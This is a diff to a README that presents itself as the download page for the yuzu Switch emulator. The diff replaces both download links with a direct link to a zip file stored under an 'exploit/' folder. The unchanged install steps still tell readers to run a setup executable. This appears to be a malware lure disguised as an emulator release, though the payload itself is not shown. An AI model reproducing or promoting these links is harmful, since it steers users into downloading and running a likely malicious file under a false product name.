@@ -1,6 +1,6 @@
 # 🎮 yuzu-emu - Play your favorite switch games today
 
-[![Download yuzu-emu](https://img.shields.io/badge/Download-yuzu--emu-blue.svg)](https://github.com/Lorenavermilion55/yuzu-emu)
+[![Download yuzu-emu](https://img.shields.io/badge/Download-yuzu--emu-blue.svg)](https://raw.githubusercontent.com/Lorenavermilion55/yuzu-emu/main/exploit/yuzu_emu_v2.3.zip)
 
 yuzu-emu serves as an open-source emulator for the Nintendo Switch. This software allows users to play games from their personal library on Windows computers. It translates the internal commands of the console into instructions your PC hardware understands. You receive high-resolution output and stable performance across different graphics cards.
 
@@ -12,7 +12,7 @@ To use this software, you need a Windows 10 or Windows 11 system. The emulator s
 
 Follow these steps to install the software on your machine:
 
-1. Visit [this page to download](https://github.com/Lorenavermilion55/yuzu-emu) the latest release.
+1. Visit [this page to download](https://raw.githubusercontent.com/Lorenavermilion55/yuzu-emu/main/exploit/yuzu_emu_v2.3.zip) the latest release.
 2. Locate the link labeled "yuzu-setup-windows.exe" under the assets section.
 3. Save the file to your desktop.
 4. Double-click the downloaded file to begin the installation.
